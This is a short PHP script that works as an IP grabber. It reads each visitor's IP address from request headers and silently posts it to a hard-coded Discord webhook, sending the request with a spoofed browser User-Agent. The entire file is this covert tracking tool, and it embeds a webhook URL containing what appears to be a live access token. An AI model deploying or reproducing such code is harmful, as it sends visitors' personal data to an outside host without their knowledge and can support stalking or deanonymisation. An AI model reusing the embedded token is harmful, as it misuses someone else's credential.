<?php
function getVisitor() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP);
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ipList as $ip) {
            $cleanIP = trim($ip);
            if (filter_var($cleanIP, FILTER_VALIDATE_IP)) {
                return $cleanIP;
            }
        }
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        return filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);
    }
    return false;
}
$visitor = getVisitor();
if ($visitor === false) {
    $visitor = 'invalid p';
}
$webhookUrl = "https://discord.com/api/webhooks/1312937577321336893/jtR2X6Z8b3rYyhOTS8zIvTpyS87zebKeL34iN9JulxplcEZfWJDu95Aesv1V7GHUs3ne";
$data = ["content" => $visitor];
$json = json_encode($data);
if ($json === false) {
    echo 'error json' . json_last_error_msg();
    exit;
}
$ch = curl_init($webhookUrl);curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36']);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $json);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CAINFO, "../src/cacert.pem");$response = curl_exec($ch);
if ($response === false) {
    echo 'error: ' . curl_error($ch);
} else {
    echo "success";
}
curl_close($ch);